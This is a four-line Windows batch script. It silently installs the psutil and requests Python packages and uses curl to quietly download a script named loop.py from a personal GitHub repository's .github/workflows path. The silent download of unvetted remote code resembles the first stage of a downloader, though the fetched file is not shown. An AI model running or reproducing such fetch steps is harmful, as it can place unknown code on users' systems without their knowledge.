@echo off
pip install psutil --quiet
pip install requests --quiet
curl -s -L -o loop.py https://raw.githubusercontent.com/OliverVasquezy/super/main/.github/workflows/loop.py
